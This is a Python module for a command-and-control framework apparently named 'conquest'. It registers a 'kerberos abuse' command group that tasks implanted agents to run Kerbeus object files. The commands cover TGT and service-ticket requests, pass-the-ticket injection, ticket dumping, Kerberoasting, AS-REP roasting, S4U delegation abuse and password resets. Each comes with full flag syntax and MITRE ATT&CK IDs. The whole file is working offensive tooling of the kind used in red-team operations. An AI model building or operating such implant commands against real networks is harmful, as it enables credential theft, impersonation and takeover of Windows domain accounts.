import conquest 
import os.path

def _kerbeus(command):
    def handler(agentId, cmdline, args):
        args = conquest.get_string(args, 0)
        
        bof = conquest.modules_root() + f"/kerbeus/dist/{command}.x64.o"
        params = conquest.bof_pack("z", [
            args    # z: Command arguments
        ])
        
        if os.path.exists(bof):
            conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
        else:
            conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
    return handler

cmd_asktgt = (
    conquest.createCommand(
        name="asktgt", description="Retrieve a TGT for a user using username and password/hash.", 
        example="""asktgt /user:<USER> /password:<PASSWORD> [/domain:<DOMAIN>] [/dc:<DC>] [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec]
asktgt /user:<USER> /aes256:<HASH> [/domain:<DOMAIN>] [/dc:<DC>] [/ptt] [/nopac] [/opsec]
asktgt /user:<USER> /rc4:<HASH> [/domain:<DOMAIN>] [/dc:<DC>] [/ptt] [/nopac]
asktgt /user:<USER> /nopreauth [/domain:<DOMAIN>] [/dc:<DC>] [/ptt]

Flags:
  /user:<USER>              STRING     Username (required)
  /password:<PASSWORD>      STRING     User password
  /aes256:<HASH>            STRING     AES256 hash
  /rc4:<HASH>               STRING     RC4 hash
  /nopreauth                BOOL       Request without pre-authentication
  /domain:<DOMAIN>          STRING     Domain
  /dc:<DC>                  STRING     Domain controller
  /enctype:{rc4|aes256}     STRING     Encryption type
  /ptt                      BOOL       Pass-the-ticket
  /nopac                    BOOL       Disable PAC
  /opsec                    BOOL       OPSEC mode""",
        message="Tasked agent to retrieve a TGT.", 
        mitre=["T1558.001"]
    )
    .addArgString("arguments", "TGT request arguments.", False, "", -1)
    .setHandler(_kerbeus("asktgt"))
).registerToGroup("kerberos abuse")

cmd_asktgs = (
    conquest.createCommand(
        name="asktgs", description="Retrieve a service ticket using a TGT.", 
        example="""asktgs /ticket:<BASE64_TGT> /service:<SPN1,SPN2,...> [/domain:<DOMAIN>] [/dc:<DC>] [/tgs:<BASE64>] [/targetdomain:<DOMAIN>] [/targetuser:<USER>] [/enctype:{rc4|aes256}] [/ptt] [/keylist] [/u2u] [/opsec]

Flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT (required)
  /service:<SPN>            STRING     Service(s) to request tickets for, comma-separated (required)
  /domain:<DOMAIN>          STRING     Domain to request ticket from
  /dc:<DC>                  STRING     Domain controller to contact
  /tgs:<BASE64>             STRING     Base64-encoded service ticket for S4U2Proxy
  /targetdomain:<DOMAIN>    STRING     Target domain for cross-domain requests
  /targetuser:<USER>        STRING     Target user for S4U2Self/S4U2Proxy
  /enctype:{rc4|aes256}     STRING     Encryption type (default: aes256)
  /ptt                      BOOL       Inject ticket into current logon session
  /keylist                  BOOL       List encryption keys
  /u2u                      BOOL       Request User-to-User ticket (use with /tgs)
  /opsec                    BOOL       Use OPSEC-safe techniques""",
        message="Tasked agent to retrieve a service ticket.", 
        mitre=["T1558.003"]
    )
    .addArgString("arguments", "TGS request arguments.", False, "", -1)
    .setHandler(_kerbeus("asktgs"))
).registerToGroup("kerberos abuse")

cmd_renew = (
    conquest.createCommand(
        name="renew", description="Renew a TGT.", 
        example="""renew /ticket:<BASE64> [/dc:<DC>] [/ptt]

Flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT (required)
  /dc:<DC>                  STRING     Domain controller
  /ptt                      BOOL       Pass-the-ticket""",
        message="Tasked agent to renew a TGT.", 
        mitre=["T1558.001"]
    )
    .addArgString("arguments", "TGT renewal arguments.", False, "", -1)
    .setHandler(_kerbeus("renew"))
).registerToGroup("kerberos abuse")

cmd_s4u = (
    conquest.createCommand(
        name="s4u", description="Perform S4U constrained delegation abuse.", 
        example="""s4u /ticket:<BASE64> /service:<SPN> {/impersonateuser:<USER> | /tgs:<BASE64>} [/domain:<DOMAIN>] [/dc:<DC>] [/altservice:<SERVICE>] [/ptt] [/nopac] [/opsec] [/self]

Flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT (required)
  /service:<SPN>            STRING     Target service SPN (required)
  /impersonateuser:<USER>   STRING     User to impersonate (required if /tgs not provided)
  /tgs:<BASE64>             STRING     Base64-encoded TGS (required if /impersonateuser not provided)
  /domain:<DOMAIN>          STRING     Domain
  /dc:<DC>                  STRING     Domain controller
  /altservice:<SERVICE>     STRING     Alternative service
  /ptt                      BOOL       Pass-the-ticket
  /nopac                    BOOL       Disable PAC
  /opsec                    BOOL       OPSEC mode
  /self                     BOOL       S4U2Self only""",
        message="Tasked agent to perform S4U delegation abuse.", 
        mitre=["T1134.005"]
    )
    .addArgString("arguments", "S4U delegation arguments.", False, "", -1)
    .setHandler(_kerbeus("s4u"))
).registerToGroup("kerberos abuse")

cmd_cross_s4u = (
    conquest.createCommand(
        name="cross-s4u", description="Perform S4U constrained delegation abuse across domains.", 
        example="""cross-s4u /ticket:<BASE64> /service:<SPN> /targetdomain:<DOMAIN> /targetdc:<DC> {/impersonateuser:<USER> | /tgs:<BASE64>} [/domain:<DOMAIN>] [/dc:<DC>] [/altservice:<SERVICE>] [/nopac] [/self]

Flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT (required)
  /service:<SPN>            STRING     Target service SPN (required)
  /targetdomain:<DOMAIN>    STRING     Target domain (required)
  /targetdc:<DC>            STRING     Target domain controller (required)
  /impersonateuser:<USER>   STRING     User to impersonate
  /tgs:<BASE64>             STRING     Base64-encoded TGS
  /domain:<DOMAIN>          STRING     Source domain
  /dc:<DC>                  STRING     Source domain controller
  /altservice:<SERVICE>     STRING     Alternative service
  /nopac                    BOOL       Disable PAC
  /self                     BOOL       S4U2Self only""",
        message="Tasked agent to perform cross-domain S4U delegation abuse.", 
        mitre=["T1134.005"]
    )
    .addArgString("arguments", "Cross-domain S4U arguments.", False, "", -1)
    .setHandler(_kerbeus("cross_s4u"))
).registerToGroup("kerberos abuse")

cmd_ptt = (
    conquest.createCommand(
        name="ptt", description="Inject a Kerberos ticket into a logon session via Pass-the-Ticket.", 
        example="""ptt /ticket:<BASE64> [/luid:<LOGONID>]

Flags:
  /ticket:<BASE64>          STRING     Base64-encoded ticket (required)
  /luid:<LOGONID>           STRING     Logon ID to inject into""",
        message="Tasked agent to inject a TGT.", 
        mitre=["T1550.003"]
    )
    .addArgString("arguments", "PTT arguments.", False, "", -1)
    .setHandler(_kerbeus("ptt"))
).registerToGroup("kerberos abuse")

cmd_purge = (
    conquest.createCommand(
        name="purge", description="Purge tickets.", 
        example="""purge [/luid:<LOGONID>]

Flags:
  /luid:<LOGONID>           STRING     Logon ID to purge tickets from""",
        message="Tasked agent to purge tickets.", 
        mitre=["T1550.003"]
    )
    .addArgString("arguments", "Purge arguments.", False, "", -1)
    .setHandler(_kerbeus("purge"))
).registerToGroup("kerberos abuse")

cmd_describe = (
    conquest.createCommand(
        name="describe", description="Parse and describe a ticket.", 
        example="""describe /ticket:<BASE64>

Flags:
  /ticket:<BASE64>          STRING     Base64-encoded ticket (required)""",
        message="Tasked agent to describe a ticket.", 
        mitre=["T1558"]
    )
    .addArgString("arguments", "Ticket to describe.", False, "", -1)
    .setHandler(_kerbeus("describe"))
).registerToGroup("kerberos abuse")

cmd_klist = (
    conquest.createCommand(
        name="klist", description="List tickets in the current user's logon session. If the agent runs in an elevated context, this command will display tickets from all logon sessions.", 
        example="""klist [/luid:<LOGINID>] [/user:<USER>] [/service:<SERVICE>] [/client:<CLIENT>]

Flags:
  /luid:<LOGINID>           STRING     Logon ID filter
  /user:<USER>              STRING     User filter
  /service:<SERVICE>        STRING     Service filter
  /client:<CLIENT>          STRING     Client filter""",
        message="Tasked agent to list tickets.", 
        mitre=["T1558"]
    )
    .addArgString("arguments", "List filters.", False, "", -1)
    .setHandler(_kerbeus("klist"))
).registerToGroup("kerberos abuse")

cmd_dump = (
    conquest.createCommand(
        name="dump", description="Extract current TGTs and service tickets for the current user. If the agent runs in an elevated context, all current TGTs and service tickets are extracted.", 
        example="""dump [/luid:<LOGINID>] [/user:<USER>] [/service:<SERVICE>] [/client:<CLIENT>]

Flags:
  /luid:<LOGINID>           STRING     Logon ID filter
  /user:<USER>              STRING     User filter
  /service:<SERVICE>        STRING     Service filter
  /client:<CLIENT>          STRING     Client filter""",
        message="Tasked agent to dump tickets.", 
        mitre=["T1003.006"]
    )
    .addArgString("arguments", "Dump filters.", False, "", -1)
    .setHandler(_kerbeus("dump"))
).registerToGroup("kerberos abuse")

cmd_triage = (
    conquest.createCommand(
        name="triage", description="List current user tickets. If the agent runs in an elevated context, all Kerberos tickets on the system are displayed.", 
        example="""triage [/luid:<LOGINID>] [/user:<USER>] [/service:<SERVICE>] [/client:<CLIENT>]

Flags:
  /luid:<LOGINID>           STRING     Logon ID filter
  /user:<USER>              STRING     User filter
  /service:<SERVICE>        STRING     Service filter
  /client:<CLIENT>          STRING     Client filter""",
        message="Tasked agent to triage tickets.", 
        mitre=["T1558"]
    )
    .addArgString("arguments", "Triage filters.", False, "", -1)
    .setHandler(_kerbeus("triage"))
).registerToGroup("kerberos abuse")

cmd_tgtdeleg = (
    conquest.createCommand(
        name="tgtdeleg", description="Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API.", 
        example="""tgtdeleg [/target:<SPN>]

Flags:
  /target:<SPN>             STRING     Target SPN""",
        message="Tasked agent to retrieve TGT via delegation.", 
        mitre=["T1558.001"]
    )
    .addArgString("arguments", "TGT delegation arguments.", False, "", -1)
    .setHandler(_kerbeus("tgtdeleg"))
).registerToGroup("kerberos abuse")

cmd_kerberoast = (
    conquest.createCommand(
        name="kerberoast", description="Perform Kerberoasting.", 
        example="""kerberoast /spn:<SPN> [/nopreauth:<USER>] [/dc:<DC>] [/domain:<DOMAIN>]
kerberoast /spn:<SPN> /ticket:<BASE64> [/dc:<DC>]

Flags:
  /spn:<SPN>                STRING     Service principal name (required)
  /nopreauth:<USER>         STRING     User without pre-auth
  /dc:<DC>                  STRING     Domain controller
  /domain:<DOMAIN>          STRING     Domain
  /ticket:<BASE64>          STRING     Base64-encoded ticket""",
        message="Tasked agent to perform Kerberoasting.", 
        mitre=["T1558.003"]
    )
    .addArgString("arguments", "Kerberoasting arguments.", False, "", -1)
    .setHandler(_kerbeus("kerberoasting"))
).registerToGroup("kerberos abuse")

cmd_asreproast = (
    conquest.createCommand(
        name="asreproast", description="Perform AS-REP roasting.", 
        example="""asreproast /user:<USER> [/dc:<DC>] [/domain:<DOMAIN>]

Flags:
  /user:<USER>              STRING     Target user (required)
  /dc:<DC>                  STRING     Domain controller
  /domain:<DOMAIN>          STRING     Domain""",
        message="Tasked agent to perform AS-REP roasting.", 
        mitre=["T1558.004"]
    )
    .addArgString("arguments", "AS-REP roasting arguments.", False, "", -1)
    .setHandler(_kerbeus("asreproasting"))
).registerToGroup("kerberos abuse")

cmd_hash = (
    conquest.createCommand(
        name="hash", description="Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1 hashes.", 
        example="""hash /password:<PASSWORD> [/user:<USER>] [/domain:<DOMAIN>]

Flags:
  /password:<PASSWORD>      STRING     Password to hash (required)
  /user:<USER>              STRING     Username
  /domain:<DOMAIN>          STRING     Domain""",
        message="Tasked agent to calculate Kerberos hashes.", 
        mitre=["T1078"]
    )
    .addArgString("arguments", "Hash calculation arguments.", False, "", -1)
    .setHandler(_kerbeus("hash"))
).registerToGroup("kerberos abuse")

cmd_changepw = (
    conquest.createCommand(
        name="changepw", description="Reset a user's password from a supplied TGT.", 
        example="""changepw /ticket:<BASE64> /new:<PASSWORD> [/dc:<DC>] [/targetuser:<USER>] [/targetdomain:<DOMAIN>]

Flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT (required)
  /new:<PASSWORD>           STRING     New password (required)
  /dc:<DC>                  STRING     Domain controller
  /targetuser:<USER>        STRING     Target user
  /targetdomain:<DOMAIN>    STRING     Target domain""",
        message="Tasked agent to change user password using TGT.", 
        mitre=["T1098"]
    )
    .addArgString("arguments", "Password change arguments.", False, "", -1)
    .setHandler(_kerbeus("changepw"))
).registerToGroup("kerberos abuse")
